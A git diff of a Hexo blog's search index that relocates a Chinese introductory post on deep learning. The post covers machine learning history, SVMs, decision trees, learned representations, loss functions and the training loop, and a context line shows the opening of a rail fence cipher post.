-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642152088067-9d026ca7-e739-4efc-a60c-fa85bdced4c4.png" alt="img"></p>
-<p>&emsp;&emsp;想要控制一件事物，首先需要能够观察它。想要控制神经网络的输出，就需要能够衡量该输出与预期值之间的距离。这是神经网络<strong>损失函数</strong>（lossfunction）的任务，该函数也叫<strong>目标函数</strong>（objective function）。损失函数的输入是网络预测值与真实目标值（即你希望网络输出的结果），然后计算一个距离值，衡量该网络在这个示例上的效果好坏（见图）。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642154784787-60b4b18c-32e0-4921-9ac1-026874f7f59c.png" alt="img"></p>
-<p>&emsp;&emsp;深度学习的基本技巧是利用这个距离值作为反馈信号来对权重值进行微调，以降低当前示例对应的损失值（见下图）。这种调节由<strong>优化器</strong>（optimizer）来完成，它实现了所谓的<strong>反向传播</strong>（backpropagation）算法，这是深度学习的核心算法。下一章中会详细地解释反向传播的工作原理。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642154826026-a8d2973c-e3f8-4e3a-a32a-4fe90f208caa.png" alt="img"></p>
-<p>&emsp;&emsp;一开始对神经网络的权重随机赋值，因此网络只是实现了一系列随机变换。其输出结果自然也和理想值相去甚远，相应地，损失值也很高。但随着网络处理的示例越来越多，权重值也在向正确的方向逐步微调，损失值也逐渐降低。这就是<strong>训练循环</strong>（training loop），将这种循环重复足够多的次数（通常对数千个示例进行数十次迭代），得到的权重值可以使损失函数最小。具有最小损失的网络，其输出值与目标值尽可能地接近，这就是训练好的网络。再次强调，这是一个简单的机制，一旦具有足够大的规模，将会产生魔法般的效果。</p>
-]]></content>
-      <categories>
-        <category>深度学习</category>
-      </categories>
-      <tags>
-        <tag>深度学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>栅栏密码</title>
     <url>/post/54ca3f77.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>&emsp;&emsp;The rail fence cipher，所谓栅栏密码，<strong>就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话</strong>。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）  </p>
@@ -3297,6 +3226,76 @@
       </categories>
       <tags>
         <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>深度学习基础——什么是深度学习</title>
+    <url>/post/76a6120c.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、人工智能、机器学习与深度学习"><a href="#一、人工智能、机器学习与深度学习" class="headerlink" title="一、人工智能、机器学习与深度学习"></a>一、人工智能、机器学习与深度学习</h1><p>&emsp;&emsp;首先，在提到人工智能时，我们需要明确定义所讨论的内容。什么是人工智能，机器学习与深度学习。这三者之间有什么关系</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642149409249-2dd2e81e-1a6d-4adf-a4da-8120216c9656.png" alt="img"></p>
+<h2 id="1、人工智能（AI）"><a href="#1、人工智能（AI）" class="headerlink" title="1、人工智能（AI）"></a>1、人工智能（AI）</h2><p>&emsp;&emsp;人工智能的简介定义如下：努力将通常由人类完成的智能任务自动化。</p>
+<h2 id="2、机器学习（Machine-Learning）"><a href="#2、机器学习（Machine-Learning）" class="headerlink" title="2、机器学习（Machine Learning）"></a>2、机器学习（Machine Learning）</h2><p>&emsp;&emsp;机器学习的概念就来自于图灵的这个问题：对于计算机而言，除了“我们命令它做的任何事情”之外，它能否自我学习执行特定任务的方法？计算机能否让我们大吃一惊？如果没有程序员精心编写的数据处理规则，计算机能否通过观察数据自动学会这些规则？</p>
+<p>&emsp;&emsp;图灵的这个问题引出了一种新的编程范式。在经典的程序设计（即符号主义人工智能的范式）中，人们输入的是规则（即程序）和需要根据这些规则进行处理的数据，系统输出的是答案。利用机器学习，人们输入的是数据和从这些数据中预期得到的答案，系统输出的是规则。这些规则随后可应用于新的数据，并使计算机自主生成答案。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150297514-da1c23f0-1ddc-464b-b81e-4369a171cc9b.png" alt="img"></p>
+<p>&emsp;&emsp;机器学习系统是<strong>训练出来的</strong>，而不是明确地用程序编写出来的。将与某个任务相关的许多示例输入机器学习系统，它会在这些示例中找到统计结构，从而最终找到规则将任务自动化。举个例子，你想为度假照片添加标签，并且希望将这项任务自动化，那么你可以将许多人工打好标签的照片输入机器学习系统，系统将学会将照片与特定标签联系在一起的统计规则。</p>
+<h3 id="（1）概率建模"><a href="#（1）概率建模" class="headerlink" title="（1）概率建模"></a>（1）概率建模</h3><p>&emsp;&emsp;<strong>概率建模</strong>（probabilistic modeling）是统计学原理在数据分析中的应用。它是最早的机器学习形式之一，至今仍在广泛使用。其中最有名的算法之一就是朴素贝叶斯算法。</p>
+<p>&emsp;&emsp;朴素贝叶斯是一类基于应用贝叶斯定理的机器学习分类器，它假设输入数据的特征都是独立的。这是一个很强的假设，或者说“朴素的”假设，其名称正来源于此。这种数据分析方法比计算机出现得还要早，在其第一次被计算机实现（很可能追溯到20世纪50年代）的几十年前就已经靠人工计算来应用了。贝叶斯定理和统计学基础可以追溯到18世纪，你学会了这两点就可以开始使用朴素贝叶斯分类器了。</p>
+<p>&emsp;&emsp;另一个密切相关的模型是logistic<strong>回归</strong>（logistic regression，简称logreg），它有时被认为是现代机器学习的“hello world”。不要被它的名称所误导——logreg是一种分类算法，而不是回归算法。与朴素贝叶斯类似，logreg的出现也比计算机早很长时间，但由于它既简单又通用，至今仍然很有用。面对一个数据集，数据科学家通常会首先尝试使用这个算法，以便初步熟悉手头的分类任务。</p>
+<h3 id="（2）核方法（Kernel-Method）"><a href="#（2）核方法（Kernel-Method）" class="headerlink" title="（2）核方法（Kernel Method）"></a>（2）核方法（Kernel Method）</h3><p>&emsp;&emsp;核方法是一组分类算法，其中最有名的就是支持向量机（SVM, support vector machine）。虽然Vladimir Vapnik和AlexeyChervonenkis早在1963年就发表了较早版本的线性公式[插图]，但SVM的现代公式由Vladimir Vapnik和Corinna Cortes于20世纪90年代初在贝尔实验室提出，并发表于1995年。</p>
+<p>&emsp;&emsp;SVM的目标是通过在属于两个不同类别的两组数据点之间找到良好<strong>决策边界</strong>（decision boundary，见图）来解决分类问题。决策边界可以看作一条直线或一个平面，将训练数据划分为两块空间，分别对应于两个类别。对于新数据点的分类，你只需判断它位于决策边界的哪一侧。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642158284514-c5f2d553-6de0-4908-ba75-f0208b74c215.png" alt="img"></p>
+<p>SVM通过两步来寻找决策边界。</p>
+<ol>
+<li>将数据映射到一个新的高维表示，这时决策边界可以用一个超平面来表示（如果数据像上图那样是二维的，那么超平面就是一条直线）。</li>
+<li>尽量让超平面与每个类别最近的数据点之间的距离最大化，从而计算出良好决策边界（分割超平面），这一步叫作<strong>间隔最大化</strong>（maximizing the margin）。这样决策边界可以很好地推广到训练数据集之外的新样本。</li>
+</ol>
+<p>&emsp;&emsp;将数据映射到高维表示从而使分类问题简化，这一技巧可能听起来很不错，但在实践中通常是难以计算的。这时就需要用到核技巧（kernel trick，核方法正是因这一核心思想而得名）。其基本思想是：要想在新的表示空间中找到良好的决策超平面，你不需要在新空间中直接计算点的坐标，只需要在新空间中计算点对之间的距离，而利用核函数（kernel function）可以高效地完成这种计算。核函数是一个在计算上能够实现的操作，将原始空间中的任意两点映射为这两点在目标表示空间中的距离，完全避免了对新新示进行直接计算。核函数通常是人为选择的，而不是从数据中学到的——对于SVM来说，只有分割超平面是通过学习得到的。</p>
+<p>&emsp;&emsp;SVM刚刚出现时，在简单的分类问题上表现出了最好的性能。当时只有少数机器学习方法得到大量的理论支持，并且适合用于严肃的数学分析，因而非常易于理解和解释，SVM就是其中之一。由于SVM具有这些有用的性质，很长一段时间里它在实践中非常流行。</p>
+<p>&emsp;&emsp;但是，SVM很难扩展到大型数据集，并且在图像分类等感知问题上的效果也不好。SVM是一种比较浅层的方法，因此要想将其应用于感知问题，首先需要手动提取出有用的表示（这叫作<strong>特征工程</strong>），这一步骤很难，而且不稳定。</p>
+<h3 id="（3）决策树、随机森林与梯度提升机"><a href="#（3）决策树、随机森林与梯度提升机" class="headerlink" title="（3）决策树、随机森林与梯度提升机"></a>（3）决策树、随机森林与梯度提升机</h3><p><strong>&emsp;&emsp;决策树</strong>（decision tree）是类似于流程图的结构，可以对输入数据点进行分类或根据给定输入来预测输出值（见图）。决策树的可视化和解释都很简单。在21世纪前十年，从数据中学习得到的决策树开始引起研究人员的广泛关注。到了2010年，决策树经常比核方法更受欢迎</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642158524521-fc44905d-8e7c-4195-817b-bc5234bab4e2.png" alt="img"></p>
+<p>&emsp;&emsp;特别是<strong>随机森林</strong>（random forest）算法，它引入了一种健壮且实用的决策树学习方法，即首先构建许多决策树，然后将它们的输出集成在一起。随机森林适用于各种各样的问题——对于任何浅层的机器学习任务来说，它几乎总是第二好的算法。广受欢迎的机器学习竞赛网站Kaggle在2010年上线后，随机森林迅速成为平台上人们的最爱，直到2014年才被梯度提升机所取代。与随机森林类似，<strong>梯度提升机</strong>（gradientboosting machine）也是将弱预测模型（通常是决策树）集成的机器学习技术。它使用了<strong>梯度提升方法</strong>，通过迭代地训练新模型来专门解决之前模型的弱点，从而改进任何机器学习模型的效果。将梯度提升技术应用于决策树时，得到的模型与随机森林具有相似的性质，但在绝大多数情况下效果都比随机森林要好。它可能是目前处理非感知数据最好的算法之一（如果非要加个“之一”的话）。和深度学习一样，它也是Kaggle竞赛中最常用的技术之一。</p>
+<h2 id="3、从数据中学习表示"><a href="#3、从数据中学习表示" class="headerlink" title="3、从数据中学习表示"></a>3、从数据中学习表示</h2><p>&emsp;&emsp;为了给出<strong>深度学习</strong>的定义并搞清楚深度学习与其他机器学习方法的区别，我们首先需要知道机器学习算法在<strong>做</strong>什么。前面说过，给定包含预期结果的示例，机器学习将会发现执行一项数据处理任务的规则。因此，我们需要以下三个要素来进行机器学习。</p>
+<ol>
+<li><strong>输入数据点</strong>。例如，你的任务是语音识别，那么这些数据点可能是记录人们说话的声音文件。如果你的任务是为图像添加标签，那么这些数据点可能是图像。</li>
+<li><strong>预期输出的示例</strong>。对于语音识别任务来说，这些示例可能是人们根据声音文件整理生成的文本。对于图像标记任务来说，预期输出可能是“狗”“猫”之类的标签。</li>
+<li><strong>衡量算法效果好坏的方法</strong>。这一衡量方法是为了计算算法的当前输出与预期输出的差距。衡量结果是一种反馈信号，用于调节算法的工作方式。<strong>这个调节步骤就是我们所说的学习。</strong></li>
+</ol>
+<p>&emsp;&emsp;机器学习模型将输入数据变换为有意义的输出，这是一个从已知的输入和输出示例中进行“学习”的过程。因此，机器学习和深度学习的核心问题在于<strong>有意义地变换数据</strong>，换句话说，在于学习输入数据的有用<strong>表示</strong>（representation）——这种表示可以让数据更接近预期输出。在进一步讨论之前，我们需要先回答一个问题：什么是表示？这一概念的核心在于以一种不同的方式来查看数据（即<strong>表征</strong>数据或将数据<strong>编码</strong>）。例如，彩色图像可以编码为RGB（红-绿-蓝）格式或HSV（色相-饱和度-明度）格式，这是对相同数据的两种不同表示。在处理某些任务时，使用某种表示可能会很困难，但换用另一种表示就会变得很简单。举个例子，对于“选择图像中所有红色像素”这个任务，使用RGB格式会更简单，而对于“降低图像饱和度”这个任务，使用HSV格式则更简单。机器学习模型都是为输入数据寻找合适的表示——对数据进行变换，使其更适合手头的任务（比如分类任务）。</p>
+<p>&emsp;&emsp;我们来具体说明这一点。考虑x轴、y轴和在这个(x, y)坐标系中由坐标表示的一些点，如图所示。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150688473-4f5aadf3-7fec-44a5-b556-1aa44336efd3.png" alt="img"></p>
+<p>可以看到，图中有一些白点和一些黑点。假设我们想要开发一个算法，输入一个点的坐标(x, y)，就能够判断这个点是黑色还是白色。在这个例子中：</p>
+<ol>
+<li>输入是点的坐标；</li>
+<li>预期输出是点的颜色；</li>
+<li>衡量算法效果好坏的一种方法是，正确分类的点所占的百分比。</li>
+</ol>
+<p>这里我们需要的是一种新的数据表示，可以明确区分白点与黑点。可用的方法有很多，这里用的是坐标变换，如图所示。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642150769639-c8f9978f-0105-4845-94b2-2b2711d115f1.png" alt="img"></p>
+<p>&emsp;&emsp;在这个新的坐标系中，点的坐标可以看作数据的一种新的表示。这种表示很棒！利用这种新的表示，用一条简单的规则就可以描述黑/白分类问题：“x&gt;0的是黑点”或“x&lt;0的是白点”。这种新的表示基本上解决了该分类问题。</p>
+<p>&emsp;&emsp;在这个例子中，我们人为定义了坐标变换。但是，如果我们尝试系统性地搜索各种可能的坐标变换，并用正确分类的点所占百分比作为反馈信号，那么我们做的就是机器学习。机器学习中的<strong>学习</strong>指的是，寻找更好数据表示的自动搜索过程。</p>
+<p>&emsp;&emsp;所有机器学习算法都包括自动寻找这样一种变换：这种变换可以根据任务将数据转化为更加有用的表示。这些操作可能是前面提到的坐标变换，也可能是线性投影（可能会破坏信息）、平移、非线性操作（比如“选择所有x&gt;0的点”），等等。机器学习算法在寻找这些变换时通常没有什么创造性，而仅仅是遍历一组预先定义好的操作，这组操作叫作<strong>假设空间</strong>（hypothesis space）。</p>
+<p>&emsp;&emsp;这就是机器学习的技术定义：在预先定义好的可能性空间中，利用反馈信号的指引来寻找输入数据的有用表示。这个简单的想法可以解决相当多的智能任务，从语音识别到自动驾驶都能解决。现在你理解了学习的含义，下面我们来看一下深度学习的特殊之处。</p>
+<h2 id="4、深度学习之“深度”"><a href="#4、深度学习之“深度”" class="headerlink" title="4、深度学习之“深度”"></a>4、深度学习之“深度”</h2><p>&emsp;&emsp;深度学习是机器学习的一个分支领域：它是从数据中学习表示的一种新方法，强调从连续的<strong>层</strong>（layer）中进行学习，这些层对应于越来越有意义的表示。“深度学习”中的“深度”指的并不是利用这种方法所获取的更深层次的理解，而是指一系列连续的表示层。数据模型中包含多少层，这被称为模型的<strong>深度</strong>（depth）。这一领域的其他名称包括<strong>分层表示学习</strong>（layered representationslearning）和<strong>层级表示学习</strong>（hierarchicalrepresentations learning）。现代深度学习通常包含数十个甚至上百个连续的表示层，这些表示层全都是从训练数据中自动学习的。与此相反，其他机器学习方法的重点往往是仅仅学习一两层的数据表示，因此有时也被称为<strong>浅层学习</strong>（shallowlearning）。</p>
+<p>&emsp;&emsp;在深度学习中，这些分层表示几乎总是通过叫作神经网络（neural network）的模型来学习得到的。神经网络的结构是逐层堆叠。神经网络这一术语来自于神经生物学，然而，虽然深度学习的一些核心概念是从人们对大脑的理解中汲取部分灵感而形成的，但深度学习模型不是大脑模型。没有证据表明大脑的学习机制与现代深度学习模型所使用的相同。你可能会读到一些流行科学的文章，宣称深度学习的工作原理与大脑相似或者是根据大脑的工作原理进行建模的，但事实并非如此。对于这一领域的新人来说，如果认为深度学习与神经生物学存在任何关系，那将使人困惑，只会起到反作用。你无须那种“就像我们的头脑一样”的神秘包装，最好也忘掉读过的深度学习与生物学之间的假想联系。就我们的目的而言，深度学习是从数据中学习表示的一种数学框架。</p>
+<p>&emsp;&emsp;深度学习算法学到的表示是什么样的？我们来看一个多层网络（见图）如何对数字图像进行变换，以便识别图像中所包含的数字。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642151850866-015eebf8-5f18-4ae1-bf4f-e6cc5b549649.png" alt="img"></p>
+<p>&emsp;&emsp;如下图所示，这个网络将数字图像转换成与原始图像差别越来越大的表示，而其中关于最终结果的信息却越来越丰富。你可以将深度网络看作多级信息蒸馏操作：信息穿过连续的过滤器，其<strong>纯度</strong>越来越高（即对任务的帮助越来越大）。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642151920619-49ed67b6-8b86-41aa-9fc4-f55effbdc9ef.png" alt="img"></p>
+<h2 id="5、用三张图理解深度学习的工作原理"><a href="#5、用三张图理解深度学习的工作原理" class="headerlink" title="5、用三张图理解深度学习的工作原理"></a>5、用三张图理解深度学习的工作原理</h2><p>&emsp;&emsp;现在你已经知道，机器学习是将输入（比如图像）映射到目标（比如标签“猫”），这一过程是通过观察许多输入和目标的示例来完成的。你还知道，深度神经网络通过一系列简单的数据变换（层）来实现这种输入到目标的映射，而这些数据变换都是通过观察示例学习到的。下面来具体看一下这种学习过程是如何发生的。</p>
+<p>&emsp;&emsp;神经网络中每层对输入数据所做的具体操作保存在该层的<strong>权重</strong>（weight）中，其本质是一串数字。用术语来说，每层实现的变换由其权重来<strong>参数化</strong>（parameterize，见下图）。权重有时也被称为该层的<strong>参数</strong>（parameter）。在这种语境下，<strong>学习</strong>的意思是为神经网络的所有层找到一组权重值，使得该网络能够将每个示例输入与其目标正确地一一对应。但重点来了：一个深度神经网络可能包含数千万个参数。找到所有参数的正确取值可能是一项非常艰巨的任务，特别是考虑到修改某个参数值将会影响其他所有参数的行为。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642152088067-9d026ca7-e739-4efc-a60c-fa85bdced4c4.png" alt="img"></p>
+<p>&emsp;&emsp;想要控制一件事物，首先需要能够观察它。想要控制神经网络的输出，就需要能够衡量该输出与预期值之间的距离。这是神经网络<strong>损失函数</strong>（lossfunction）的任务，该函数也叫<strong>目标函数</strong>（objective function）。损失函数的输入是网络预测值与真实目标值（即你希望网络输出的结果），然后计算一个距离值，衡量该网络在这个示例上的效果好坏（见图）。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642154784787-60b4b18c-32e0-4921-9ac1-026874f7f59c.png" alt="img"></p>
+<p>&emsp;&emsp;深度学习的基本技巧是利用这个距离值作为反馈信号来对权重值进行微调，以降低当前示例对应的损失值（见下图）。这种调节由<strong>优化器</strong>（optimizer）来完成，它实现了所谓的<strong>反向传播</strong>（backpropagation）算法，这是深度学习的核心算法。下一章中会详细地解释反向传播的工作原理。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642154826026-a8d2973c-e3f8-4e3a-a32a-4fe90f208caa.png" alt="img"></p>
+<p>&emsp;&emsp;一开始对神经网络的权重随机赋值，因此网络只是实现了一系列随机变换。其输出结果自然也和理想值相去甚远，相应地，损失值也很高。但随着网络处理的示例越来越多，权重值也在向正确的方向逐步微调，损失值也逐渐降低。这就是<strong>训练循环</strong>（training loop），将这种循环重复足够多的次数（通常对数千个示例进行数十次迭代），得到的权重值可以使损失函数最小。具有最小损失的网络，其输出值与目标值尽可能地接近，这就是训练好的网络。再次强调，这是一个简单的机制，一旦具有足够大的规模，将会产生魔法般的效果。</p>
+]]></content>
+      <categories>
+        <category>深度学习</category>
+      </categories>
+      <tags>
+        <tag>深度学习</tag>
       </tags>
   </entry>
 </search>
